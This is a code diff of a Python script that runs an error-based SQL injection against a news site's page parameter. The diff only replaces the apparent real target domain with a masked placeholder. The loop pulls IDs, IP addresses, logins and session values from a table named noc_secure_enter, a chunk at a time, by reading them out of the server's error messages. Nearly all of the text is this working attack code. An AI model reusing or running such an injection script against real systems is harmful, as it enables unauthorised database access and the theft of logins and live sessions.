@@ -21,7 +21,7 @@ if __name__ == '__main__':
     counter = 1
     lines = []
     for i in range(1, 40):
-        url = f"https://nocvko.ru/news/page/1%20or(extractvalue(0x0a,concat(0x0a,(select%20MID(GROUP_CONCAT(id,':',ip,':'," \
+        url = f"https://XXXXXX.XXX/news/page/1%20or(extractvalue(0x0a,concat(0x0a,(select%20MID(GROUP_CONCAT(id,':',ip,':'," \
               f"login,':',enter,':',':',session),{counter},31)%20from%20noc_secure_enter%20where%20id>153))))or%202"
         response = requests.get(url)
         splitted = response.text.split("syntax error: '")
